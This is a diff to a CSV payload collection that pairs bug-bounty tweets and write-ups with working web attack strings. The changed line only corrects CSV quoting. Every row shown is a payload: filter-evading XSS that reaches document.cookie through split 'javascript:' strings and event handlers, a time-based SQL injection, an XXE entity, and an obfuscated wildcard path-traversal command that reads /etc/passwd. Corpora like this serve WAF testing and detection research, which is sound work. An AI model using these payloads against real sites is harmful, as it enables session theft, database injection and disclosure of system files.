@@ -459,7 +459,7 @@ https://twitter.com/0SPwn/status/1651740036717576195,"""><a href=jav&#x0D;ascrip
 https://twitter.com/0x0SojalSec/status/1653830922679250944,/???/???/c?t$IFS/???/p?s?w?,ptrav
 https://twitter.com/gdprAI/status/1653160069109026816,"<!DOCTYPE foo [<!ENTITY % a ""&#x3c;&#x21; ... omitted ...", xxe
 https://wpscan.com/vulnerability/c5e395f8-257e-49eb-afbd-9c1e26045373,"{""sku"":""a\"" AND (SELECT 42 FROM (SELECT(SLEEP(5)))wlHd)-- pOeU""}",sqli
-https://twitter.com/ShawarkOFFICIAL/status/1656050953660043265,"><BODy onbeforescriptexecute="x1='cookie';c=')';b='a';location='jav'+b+'script:con'+'fir\u006d('+'document'+'.'+x1+c">,xss
+https://twitter.com/ShawarkOFFICIAL/status/1656050953660043265,"><BODy onbeforescriptexecute=""x1='cookie';c=')';b='a';location='jav'+b+'script:con'+'fir\u006d('+'document'+'.'+x1+c"">",xss
 https://medium.com/@lopseg/bug-bounty-writeup-stored-xss-vulnerability-waf-bypass-f38aae7ff9eb,<a href="http://example.com;" onmouseover="z=top;z[/al/.source%2b/ert/.source](8);//test.com/",xss
 https://twitter.com/ClumsyLulz/status/1659625523943751702,<svg>on%20onload%3D(“XSS”)(document.domain)<%2Fsvg>,xss
 https://medium.com/@cyberninja717/reflected-cross-site-scripting-vulnerability-in-ellucian-ethos-identity-cas-logout-page-685bb1675dfb,http://example.com%22%3E%3Csvg%3E%3Cimage%20xlink:href=%22path/to/image.jpg%22%20onerror=confirm(document.location)%3E,xss
